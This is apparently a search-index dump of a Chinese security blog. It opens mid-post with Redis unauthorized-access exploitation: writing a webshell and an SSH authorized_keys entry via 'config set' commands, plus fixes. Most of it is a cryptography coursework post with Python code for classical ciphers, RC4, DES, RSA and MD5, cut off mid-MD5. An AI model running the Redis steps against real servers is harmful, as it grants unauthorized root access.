save成功后，目标主机的网站根目录就出现了木马文件 使用蚁剑连接 2.写ssh-keygen公钥然后使用私钥进行登陆写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。 首先生成公钥密钥文件 ssh-keygen -t rsa cat /root/.ssh/id_rsa.pub 继续使用命令 config set dir /root/.ssh/ config set authorized_keys set x &quot;\\n\\n\\n\\id_rsa.pub的内容\\n\\n\\n&quot; save 使用公钥连接 ssh -i id_rsa root@192.168.164.23 这里的id_rsa与创建ssh密钥输入的内容一致 3.利用计划任务反弹shell只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用 漏洞修复1、限制登录ip在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。 2、添加密码在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。 3、修改默认端口","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"xxe","slug":"xxe","permalink":"https://sunzhengyu99.github.io/tags/xxe/"}]},{"title":"密码学","date":"2020-12-23T08:37:43.000Z","path":"2020/12/23/密码学/","text":"密码学实验课程设计 一、古典密码仿射密码简介仿射加密在本质上还是一个置换密码：如果说移位密码是一个常数级别的置换，那么，仿射加密是一个一次级别的置换 加密原理假设X，Y，A，B是Z26整数环中的元素，A和B为密钥，X是原文，Y是密文 加密函数：Y=（AX+B）%26 解密函数：Y=（AX+B）%26，得到：X=（A的逆元）*（Y-B）%26 原理很简单，代码实现也比较简单 代码实现各个函数作用 gcd(a,b) 求a,b的最大公因子 findModReverse(a,m) 计算a模m的逆元 encode(a,b,s) 仿射加密 decode(a,b,s) 仿射解密 利用扩展的欧几里得算法求逆元 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m 完整代码如下 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def encode(a,b,s): result = &quot;&quot; # 保存加密结果 s = s.upper() # 全部转换为大写，方便计算 for i in range(0,len(s)): s2 = chr((a*(ord(s[i])-65)+b)%26 + 65) #使用加密公式 Y=（AX+B）%26 result = result +s2 print(result.lower()) def decode(a,b,s): a1 = findModReverse(a,26) result = &quot;&quot; s = s.upper() for i in range(0, len(s)): s2 = chr((a1 * (ord(s[i]) - 65 - b)) % 26 + 65) # 使用解密公式X=（A的逆元）*（Y-B）%26 result = result + s2 print(result.lower()) def s_decode(a,b,s): letter =&#x27;abcdefghijklmnopqrstuvwxyz&#x27; letter = letter.upper() s = s.upper() result = &quot;&quot; for i in s: for j in range(0,len(letter)): if i == letter[(a*j+b)%26]: result = result+letter[j] print(result.lower()) def main(): # 主函数入口 answer = input(f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;) try: if answer.upper() == &#x27;E&#x27;: a = int(input(&#x27;请输入a:&#x27;)) b = int(input(&#x27;请输入b:&#x27;)) s = input(&#x27;请输入需要加密的字符:&#x27;) encode(a, b, s) elif answer.upper() == &#x27;D&#x27;: a = int(input(&#x27;请输入a:&#x27;)) b = int(input(&#x27;请输入b:&#x27;)) s = input(&#x27;请输入需要解密的字符：&#x27;) decode(a, b, s) # 利用逆元解密 # s_decode(a,b,s) # 暴力枚举每一个字符 else: print(&#x27;输入错误！&#x27;) except KeyError: print(&#x27;请勿输入空格！&#x27;) if __name__ == &#x27;__main__&#x27;: main() # a = 7, b = 22 # plain = firstthesentenceandthentheevidencesaidthequeen # crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj 加解密结果如图所示 破解仿射密码这里使用了加解密中的 gcd findModReverse，找出26以内且与26互素的所有数的逆元，并存放在一个列表中 def findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all 完整代码如下 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all def decode(s): re_all = findAllre() for k1 in re_all: for k2 in range(0, 26): result = &quot;&quot; for i in range(len(s)): s2 = chr(((int(k1) * (ord(s[i]) - 97 - k2)) % 26 + 97)) result = result + s2 print(&quot;k1=&quot; + str(findModReverse(k1,26)) + &quot;, k2=&quot; + str(k2) + &quot; plaintext = &quot; + result) def main(): # criphertext = &#x27;falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj&#x27; criphertext = input(&quot;请输入要破解的密文: &quot;) criphertext = criphertext.lower() print(&quot;---------&quot;*3+&quot;strat attck&quot;+&quot;---------&quot;*3) decode(criphertext) if __name__ == &#x27;__main__&#x27;: main() 效果如下 维吉尼亚密码1.简介维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。 维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（意大利语：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。 维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。 2.加解密原理 加解密代码 # 将密钥处理成和密文/明文一样长 def solve_key(s,key): nkey = key while len(nkey) &lt; len(s): nkey = nkey+key nkey = nkey[:len(s)] return nkey # 加密函数 def encode(s,key): print(&#x27;加密后的结果： &#x27;,end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0,len(s)): s2 = chr(abs(((ord(s1[i])-65)+(ord(key1[i])-65)) % 26) + 65) result = result + s2 print(result.lower()) # 解密函数 def decode(s,key): print(&#x27;解密后的结果： &#x27;, end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0, len(s)): s2 = chr(((ord(s1[i]) - 65) - (ord(key1[i]) - 65)) % 26 + 65) result = result + s2 print(result.lower()) def main(): while 1: # 函数入口 answer = input(f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;) try: if answer.upper() == &#x27;E&#x27;: key = input(&#x27;请输入密钥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;请输入明文: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) # 将字符串中的非字母字符去掉 # print(s) encode(s, key) elif answer.upper() == &#x27;D&#x27;: key = input(&#x27;请输入密钥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;请输入密文: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) decode(s, key) else: print(&#x27;输入错误！&#x27;) except KeyError: print(&#x27;请检查输入是否正确！&#x27;) if __name__ == &#x27;__main__&#x27;: main() 二、序列密码LFSR代码实现 def lsrf(inti, top): sum = 0 inti2 = &quot;0&quot;*len(inti) inti2 = list(inti2) inti1 = &#x27;&#x27; for i in range(len(inti)): if top[i] == &quot;1&quot;: sum += int(inti[i]) sum = sum % 2 for i in range(len(inti)): if i == 0: inti2[i] = str(sum) else: inti2[i] = inti[i - 1] inti1 = inti1.join(inti2) return inti1 def main(): inti_str = str(input(&quot;请输入初始化序列：&quot;)) inti_str = inti_str[::-1] inti_str_backup = inti_str top = str(input(&quot;请输入本原多项式：&quot;)) top = top[::-1] for i in range(2 ** len(inti_str) + 1): if inti_str_backup == inti_str and i != 0 and i == 2 ** len(inti_str) - 1: print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) print(&quot;是本原多项式且周期是&quot; + str(i)) break elif inti_str_backup == inti_str and i != 0 and i != 2 ** len(inti_str) - 1: print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) print(&quot;不是本原多项式且周期是&quot; + str(i)) break print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) inti_str_backup = lsrf(inti_str_backup, top) if __name__ == &#x27;__main__&#x27;: main() 选择本原多项式和初始序列如下 100000000001000000 011100010100100101 程序运行结果 RC4完整代码 import hashlib import base64 # S盒初始化置换,Key为密钥 def Rc4_init(S, Key): j = 0 Key = Key.encode(&#x27;UTF-8&#x27;) Key = hashlib.md5(Key).hexdigest() # 长度为32的字符串 tmp = [] for i in range(256): S.append(i) tmp.append(Key[i % len(Key)]) for i in range(256): j = (j + S[i] + ord(tmp[i])) % 256 S[i], S[j] = S[j], S[i] # 交换S[i],S[j] def rc4_Encode(S, plaintext): i = j = 0 result = &#x27;&#x27; for a in plaintext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k result = base64.b64encode(result.encode(&#x27;UTF-8&#x27;)) result = result.decode() return result def rc4_Decode(S, criphtext): i = j = 0 criphtext = base64.b64decode(criphtext) criphtext = str(criphtext.decode()) result = &#x27;&#x27; for a in criphtext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k return result def main(): while 1: order = input(&quot;请输入指令,加密/E,解密/D :&quot;) if order.upper() ==&#x27;E&#x27;: plaintext = input(&#x27;请输入明文: &#x27;) key = input(&quot;请输入密钥: &quot;) s = [] Rc4_init(s, key) cryphtext = rc4_Encode(s, plaintext) print(&quot;密文为: &quot;, cryphtext) print(&#x27;\\n&#x27;) else: cryphtext = input(&quot;请输入密文: &quot;) key = input(&quot;请输入密钥: &quot;) s = [] Rc4_init(s, key) plaintext = rc4_Decode(s, cryphtext) print(&quot;明文为: &quot;, plaintext) print(&#x27;\\n&#x27;) if __name__ == &#x27;__main__&#x27;: main() 三、DESDEC_ECB模式 # 两字符进行异或运算 def xor(str1, str2): res = &quot;&quot; for i in range(0, len(str1)): xor_res = int(str1[i], 10)^int(str2[i], 10) if xor_res == 1: res += &#x27;1&#x27; else: res += &#x27;0&#x27; return res # 处理字符串，将每个字符串都转成八位二进制数 def str_process(str): res = &quot;&quot; for i in str: tmp = bin(ord(i))[2:] tmp = (8 - len(tmp)) * &#x27;0&#x27; + tmp # 不够八位则在前面补 0 res += tmp return res # PC-1盒处理 def key_change_1(str): change_table = [57,49,41,33,25,17,9,1, 58,50,42,34,26,18,10, 2,59,51,43,35,27,19,11, 3,60,52,44,36,63,55,47, 39,31,23,15,7,62,54,46, 38,30,22,14,6,61,53,45, 37,29,21,13,5,28,20,12,4] res = &quot;&quot; for i in change_table: res += str[i-1] return res # PC-2盒处理 def key_change_2(str): change_table = [14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] res = &quot;&quot; for i in change_table: res += str[i-1] return res # 循环左移 def left_run(str, num): tmp_str = str[num:len(str)] tmp_str = tmp_str+str[0:num] return tmp_str # 生成16个子密钥 def key_gen(str): key_list = [] key_change_res = key_change_1(str) key_c = key_change_res[0:28] key_d = key_change_res[28:] num = [0, 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1] for i in range(1, 17): #共16轮 key_c = left_run(key_c, num[i]) key_d = left_run(key_d, num[i]) key_yiwei = key_c + key_d key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_list # IP盒处理 def begin_change(str): change_table = [58,50,42,34,26,18,10,2, 60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6, 64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1, 59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5, 63,55,47,39,31,23,15,7] res = &quot;&quot; for i in change_table: res += str[i-1] return res # E盒处理 32位-&gt;48位 def E_box(str): change_table = [32,1,2,3,4,5,4,5, 6,7,8,9,8,9,10,11, 12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21, 22,23,24,25,24,25,26,27, 28,29,28,29,30,31,32,1] res = &quot;&quot; for i in change_table: res += str[i-1] return res # s盒处理 48位-&gt;32位 def S_box(str): j = 0 s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11] ] res = &quot;&quot; for i in range(0, len(str), 6): begin_s = str[i:i + 6] row = int(begin_s[0] + begin_s[5], 2) #第一位和第六位作为行 col = int(begin_s[1:5], 2) #中间四位作为列 index = s_list[j][row * 16 + col] num = bin(index)[2:] #将匹配的数字转换位二进制数 for k in range(0, 4 - len(num)): #不够4位则补0 num = &quot;0&quot; + num res += num j = j + 1 return res # p盒处理 置换操作 def P_box(str): res = &quot;&quot; change_table = [16,7,20,21,29,12,28,17, 1,15,23,26,5,18,31,10, 2,8,24,14,32,27,3,9, 19,13,30,6,22,11,4,25] for i in change_table: res += str[i - 1] return res # F函数 def F_function(str, key): # R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或-&gt;S盒-&gt;P置换 str_e_res = E_box(str) # 将 E 异或 S P 集合到一个函数种，便于调用 xor_res = xor(str_e_res, key) str_s_res = S_box(xor_res) str_p_res = P_box(str_s_res) return str_p_res # 逆IP盒 def IP_re(str): res = &quot;&quot; ip_list = [40,8,48,16,56,24,64,32, 39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30, 37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28, 35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26, 33,1,41,9,49,17,57,25 ] for i in ip_list: res += str[i-1] return res # DES加密操作 def DESencode(text, key): text_bin = str_process(text) # 将字符转换为二进制数 text_IP = begin_change(text_bin) # 明文初始置换 key_bin = str_process(key) # 将密钥转换位二进制数 key_list = key_gen(key_bin) # key_lsst 数组中存放着十六个子密钥 text_left = text_IP[0:32] # R0 text_right = text_IP[32:] # L0 for i in range(0, 15): # 十五轮加密 mes_tmp = text_right # 临时变量用于左右两部分交换 text_right = xor(F_function(text_right, key_list[i]) , text_left) #F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) text_left = mes_tmp fin_right = text_right # 第十六轮加密 fin_left = xor(F_function(text_right, key_list[15]), text_left) criph_text = fin_left + fin_right criph_text = IP_re(criph_text) # IP逆置换 return criph_text # 针对一组的解密程序 def DESdecode(text, key): #密文直接输64位2进制 key_bin = str_process(key) # 将密钥转换为二进制数 key_list = key_gen(key_bin) # 生成的十六个子密钥 text = begin_change(text) # 先初始值换 与加密过程相反 cipher_left = text[0:32] # R16 cipher_right = text[32:] # L16 i = 15 while i &gt; 0: # 十五轮加密 反过来 cipher_tmp = cipher_right #设置一个临时变量用于后面的交换 cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i])) # F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) # F 函数处理完后与L(32位)异或 cipher_left = cipher_tmp # 左右交换完成 i = i - 1 left_text = xor(cipher_left, F_function(cipher_right, key_list[0])) # 一 right_text = cipher_right # 二 三 这三步是第十六轮加密 plain_bin = left_text + right_text # plain_bin = IP_re(plain_bin) # plain_text = &quot;&quot; for i in range(0, len(plain_bin), 8): plain_text += chr(int(plain_bin[i:i + 8], 2)) return plain_text def Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for text in block_text: # 分别对每组加密 res += DESencode(text, key) else: for text in block_text: # 对密文解密 res += DESdecode(text, key) return res def main(): while 1: plaintext = &#x27;&#x27; ciphertext = &#x27;&#x27; key = &#x27;&#x27; order = input(&quot;加密请按E,解密请按D:&quot;) if order == &#x27;E&#x27;: plaintext = input(&quot;请输入明文：&quot;) key = input(&quot;请输入密钥：&quot;) ciphertext = Divide_text(order, plaintext, key) print(&quot;密文是：&quot;) print(ciphertext) else: ciphertext = input(&quot;请输入密文：&quot;) key = input(&quot;请输入密钥：&quot;) plaintext = Divide_text(order, ciphertext, key) print(&quot;明文是：&quot;) print(plaintext) if __name__ == &#x27;__main__&#x27;: main() DES_CBC模式 只需要修改ECB模式中的 Divide_text 部分 def Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] IV = &#x27;aaaaaaaa&#x27; # 初始化向量 IV_bin = str_process(IV) res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length tmp = &quot;&quot; # 加密 if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for i in range(len(block_text)): # 分别对每组加密 if i == 0 : tmp = DESencode(block_text[i],key, IV_bin) res += tmp else: tmp = DESencode(block_text[i],key,tmp) res += tmp # 解密 else: for i in range(len(block_text)): if i == 0: tmp = block_text[i] res += DESdecode(block_text[i], key, IV_bin) else: res += DESdecode(block_text[i], key, tmp) tmp = block_text[i] return res 四、RSA# -*- coding = utf - 8 -*- #@Time : 2020/12/23 14:24 #@Author : sunzy #@File : rsa.py from Crypto.Util.number import * import random # 模重复平方法 def fast_mod(p,q,n): # p为底数，p为指数 res = 1 while q: if q &amp; 1: res = (res * p) % n q &gt;&gt;= 1 # 右移1位 p = (p * p) % n return res # 计算出d #这个扩展欧几里得算法求模逆,用于求d def caculateD(a, m): u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m # 将字符转化为十六进制字符串 def str2Hex(m): return &quot;&quot;.join(&quot;&#123;:02x&#125;&quot;.format(ord(x)) for x in m) # 素性检验：采用 Miler-Rabin 检验法 # 所有的𝑟 ∈ [0, 𝑠 − 1]，若𝑎^𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠ −1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则，𝑛有 3/4的概率为素数 def miller_rabin(n): s = n - 1 t = 0 while s % 2 == 0: # n,s,t之间的关系为 n = 2^s * t s = s // 2 t += 1 for trials in range(10): # 可以多增加几轮保证大概率为素数 a = random.randrange(2, n - 1) # 随机生成a v = pow(a, s, n) # 验证 a^(n-1) mod n if v != 1: i = 0 while v != (n - 1): if i == t - 1: return False else: i = i + 1 v = (v ** 2) % n return True # 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数 def genPrime(b=1024): while True: # 设置死循环直到生成素数才退出 res = &quot;1&quot; for i in range(b-2): res += str(random.randint(0,1)) res += &quot;1&quot; # 最后一位为1保证为奇数 res = int(res,2) if miller_rabin(res): return res # 直到该数通过素数检验才推出循环 def genE(phi_n): while True: e = genPrime(b=random.randint(3,13)) #随机生成e if e &lt; 2000 : # e不能太小 continue if phi_n%e != 0: # 保证e不能被phi整除 return e def RSAEncode(m, e, n): # 加密公式 m^e mod n m = int(str2Hex(m), 16) # 将字符转换为二进制 c = fast_mod(m, e, n) return c def RSADecode(c, d, n): # 加密公式 c^d mod n plaintext = fast_mod(c,d,n) plaintext = str(long_to_bytes(plaintext).decode()) # 将数字转换为字符 return plaintext def main(): # 生成两个大素数p和q print(&quot;Generate p,q and e, please wait... &quot;) p = genPrime() q = genPrime() print (&quot;p = &quot;+str(p)) print (&quot;q = &quot;+str(q)) n = p*q print (&quot;n = &quot;+str(n)) # 用欧拉定理计算 phi_n phi_n = (p-1)*(q-1) # 生成e e = genE(phi_n) print (&quot;e = &quot;+str(e)) # m = &quot;Hello world!&quot; m = str(input(&#x27;请输入明文: &#x27;)) # 加密算法 Cryphtext = RSAEncode(m, e, n) print (&quot;The Ciphertext is: &quot;+str(Cryphtext)) # 解密算法 d = caculateD(e, phi_n) Plaintext = RSADecode(Cryphtext, d, n) print (&quot;The Plaintext is: &quot;+Plaintext) if __name__ == &#x27;__main__&#x27;: main() 五、MD5# -*- coding = utf - 8 -*- #@Time : 2020/12/18 21:50 #@Author : sunzy #@File : MD5.py import math # 定义初始向量abcd,并将其转换成2进制,且补0到32位 # 标准的幻数（物理顺序）是（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是: # （A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） ABCD_list = [&#x27;67452301&#x27;,&#x27;efcdab89&#x27;,&#x27;98badcfe&#x27;,&#x27;10325476&#x27;] for i in range(len(ABCD_list)): tmp = bin(int(ABCD_list[i], 16))[2:] if len(tmp) &lt; 32: tmp = (32 - len(tmp)) * &#x27;0&#x27; + tmp ABCD_list[i] = tmp A0,B0,C0,D0 = ABCD_list[0], ABCD_list[1], ABCD_list[2], ABCD_list[3] # 生成第1-64个式子的第i个32比特常数 Ti = [] for i in range(0, 64): result = (int(4294967296 * abs(math.sin(i + 1)))) &amp; 0xffffffff result = bin(result)[2:] if len(result) &lt; 32: result = (32 - len(result)) * &#x27;0&#x27; + result Ti.append(result) # 实现x,y的逐比特与 def and1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])&amp;int(y[i])) return res # 实现x,y的逐比特或 def or1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])|int(y[i])) return res # 实现x,y的逐比特异或 def xor(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])^int(y[i])) return res # 实现x的逐比特逻辑反 def reverse(x): res = &#x27;&#x27; for i in range(0, len(x)): res += str((int(x[i], 2) + 1) % 2) return res # 实现x的循环左移 def shift(x, i): res = &#x27;&#x27; for t in range(0, len(x) - i): res = res + x[t + i:t + i + 1] # 先保存 x[i:] 再保存x[:i] for y in range(0, i): res = res + x[y:y + 1] return res # 实现整数模2的三十二次方加法 def add(x, y): a = int(x,2) #先将二进制转换成十进制 b = int(y,2) res = (a + b)%(2**32) res = str(bin(res)[2:]) if len(res) != 32: # 补充到32位 res = (32-len(res))*&#x27;0&#x27;+res return res # 定义f,g,h,i函数 def ffunc(x, y, z): # ((x&amp;y)|((~x)&amp;z)) t = and1(x, y) t1 = reverse(x) t2 = and1(t1, z) return or1(t, t2) def gfunc(x, y, z): # ((x&amp;z)|(y&amp;(~z))) t = and1(x, z) t1 = reverse(z) t2 = and1(y, t1) return or1(t, t2) def hfunc(x, y, z): # (x^y^z) t1 = xor(x, y) t2 = xor(t1, z) return t2 def ifunc(x, y, z): # (y^(x|(~z))) t = reverse(z) t1 = or1(x, t) return xor(y, t1) def fill(text): text1 = &#x27;&#x27; for i in text: t = str(ord(i)) t = str(bin(int(t, 10))[2:]) if len(t) &lt; 8: # 将每个字符转换成8位二进制数 for num in range(8 - len(t)): t = &#x27;0&#x27; + t text1 = text1 + t length = len(text1) length1 = 512 - len(text1) - 65 # length1是要填充0的位数 text1 = text1 + &#x27;1&#x27; # 第一位添加 0 text1 = text1 + &#x27;0&#x27;*length1 # 将其补充到 N*512+448 N可以为0 text2 = bin(length)[2:] # 将字符长度转换成二进制数 if len(text2) &lt; 8: # 填充后面64位,先填充字符串的长度,再补0 text2 = &#x27;0&#x27;*(8 - len(text2)) + text2 length2 = 64 - len(text2) text2 = text2 + &#x27;0&#x27;*length2 # 填充后面64位,先填充字符串的长度,再补0 return text1 + text2 # 将最后得到的ABCD逆序输出 最后一步使用 def reverse_order(a): res = a[24:32] + a[16:24] + a[8:16] + a[0:8] return res # 输入要加密的明文 password = input(&quot;请输入要加密的信息:&quot;) # 填充算法 x = fill(password) j = 0 M = [] for i in range(0,len(x),32): # 将512位分成十六组 M.append(x[i:i+32]) M[j] = M[j][24:32] + M[j][16:24] + M[j][8:16] + M[j][0:8] j+=1 # md5算法的第一步 A,B,C,D= A0,B0,C0,D0 #为第五步 相加原始的A,B,C,D做备份 # md5算法的第二步 AA,BB,CC,DD = A,B,C,D # md5算法的第三步 # 第一轮 每轮A,B,C,D都处理四次，四轮就是十六次，一共六十四次 for i in range(4): # f函数 A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[4*i]), Ti[4 * i])), 7)) D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[4*i+1]), Ti[4 * i + 1])), 12)) C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[4*i+2]), Ti[4 * i + 2])), 17)) B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[4*i+3]), Ti[4 * i + 3])), 22)) # 第二轮 k = 1 j = 16 for i in range(4): A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+5*(4*i))%16]), Ti[j + i * 4])), 5)) D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+5*(4*i+1))%16]), Ti[j + i * 4 + 1])), 9)) C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+5*(4*i+2))%16]), Ti[j + i * 4 + 2])), 14)) B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+5*(4*i+3))%16]), Ti[j + i * 4 + 3])), 20)) # 第三轮 k = 5 j = 32 for i in range(4): A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*4*3)%16]), Ti[j + i * 4])), 4)) D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*4+1)*3)%16]), Ti[j + i * 4 + 1])), 11)) C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*4+2)*3)%16]), Ti[j + i * 4 + 2])), 16)) B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*4+3)*3)%16]), Ti[j + i * 4 + 3])), 23)) # 第四轮 k = 0 j = 48 for i in range(4): A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*4)*7)%16]), Ti[j + i * 4])), 6)) D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*4+1)*7)%16]), Ti[j + i * 4 + 1])), 10)) C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*4+2)*7)%16]), Ti[j + i 